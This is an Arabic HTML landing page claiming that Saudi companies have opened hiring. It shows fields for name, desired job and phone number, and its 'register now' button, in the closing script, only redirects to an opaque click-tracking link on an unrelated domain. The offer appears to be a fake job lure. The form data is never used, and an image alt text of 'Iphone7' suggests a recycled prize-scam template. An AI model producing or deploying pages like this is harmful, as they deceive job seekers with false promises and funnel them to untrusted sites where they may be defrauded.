<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>تم فتح باب التعيين</title>
  <meta content='https://i.imgur.com/9eMFbkA.png' name='og:image'/>
  <link href='https://i.imgur.com/Z18jeWS.png' rel='shortcut icon'/>
  
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@200;300;400;500;600;700;900&display=swap');
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Cairo', sans-serif;
      background: url('https://i.imgur.com/IghvMFe.jpg') no-repeat center center fixed;
      background-size: cover;
      color: #fff;
      direction: rtl;
      overflow-x: hidden;
    }

    h1, h2, h3, h4 {
      font-weight: 400;
    }

    h2 {
      font-size: 1.3em;
      text-align: center;
      margin: 10px 0;
    }

    a {
      text-decoration: none;
      color: #fff;
      font-weight: bold;
      padding: 10px 20px;
      background-color: #ff5e00;
      border-radius: 5px;
      display: inline-block;
      transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
    }

    a:hover {
      background-color: #ff3c00;
      transform: scale(1.1);
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
    }

    #wrapper {
      margin-top: 60px;
      padding: 20px;
    }

    #questionWrapper {
      background: rgba(0, 0, 0, 0.6);
      width: 90%;
      margin: 30px auto;
      padding: 20px;
      border-radius: 15px;
      max-width: 985px;
      text-align: center;
    }

    #intro {
      margin: 20px 0;
    }

    #intro img {
      width: 80%;
      max-width: 500px;
      border-radius: 15px;
      margin-bottom: 20px;
    }

    .input-field {
      width: 80%;
      max-width: 400px;
      padding: 10px;
      margin: 10px 0;
      border-radius: 5px;
      font-size: 16px;
      border: none;
      transition: border 0.3s ease;
    }

    .input-field:focus {
      outline: none;
      border: 2px solid #ff5e00;
    }

    .answer {
      background-color: #e74c3c;
      color: white;
      border-radius: 5px;
      padding: 10px 20px;
      font-size: 16px;
      margin: 20px 0;
      display: inline-block;
      width: 80%;
      max-width: 400px;
      cursor: pointer;
      transition: background-color 0.3s ease, transform 0.3s ease, box-shadow 0.3s ease;
    }

    .answer:hover {
      background-color: #ff3c00;
      transform: scale(1.05);
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
    }

    .center {
      text-align: center;
    }

    .center img {
      border-radius: 10px;
      max-width: 100%;
      height: auto;
    }

    .waiting-message {
      display: none;
      background-color: #ff9800;
      color: white;
      padding: 15px;
      border-radius: 10px;
      margin-top: 20px;
      font-size: 18px;
    }

    @media (max-width: 768px) {
      #questionWrapper {
        width: 95%;
      }
    }

    @media (max-width: 480px) {
      h2 {
        font-size: 14px;
      }

      .input-field, .answer {
        width: 90%;
      }
    }
  </style>
</head>
<body>

  <div id="wrapper">
    <!-- Main Content Section -->
    <div id="questionWrapper">
      <div id="intro">
        <img src="https://i.imgur.com/IghvMFe.jpg" alt="Iphone7" class="center">
        <p><b>شركات السعودية</b><br> تم فتح باب التعيين . للحصول على وظيفتك الخاصة، من فضلك قم بملء التفاصيل أدناه:</p>
      </div>

      <!-- Name Input -->
      <div>
        <h2>الاسم الكامل</h2>
        <input type="text" class="input-field" placeholder="أدخل اسمك هنا">
      </div>

      <!-- Job Selection Input -->
      <div>
        <h2>الوظيفة التي ترغب في التقديم لها</h2>
        <input type="text" class="input-field" placeholder="أدخل الوظيفة هنا">
      </div>

      <!-- Phone Number Input -->
      <div>
        <h2>رقم الهاتف</h2>
        <input type="tel" class="input-field" placeholder="أدخل رقم هاتفك هنا">
      </div>

      <!-- Final Registration Button -->
      <div class="question question6">
        <h2>برجاء التسجيل برقم الهاتف ليتم التواصل</h2>
        <div class="answer" id="phone-register-button">سجل الآن</div>
      </div>
      
    </div>
  </div>

  <script>
    // jQuery for button click behavior
    document.querySelectorAll('.answer').forEach(function(button) {
      button.addEventListener('click', function() {
        // Redirect to phone registration page on button click
        if (button.id === 'phone-register-button') {
          window.location.href = "https://bjlowtm.com/cl/5d97887d02e321dc?p1=&p2=&source=&site=";
        }
      });
    });
  </script>

</body>
</html>
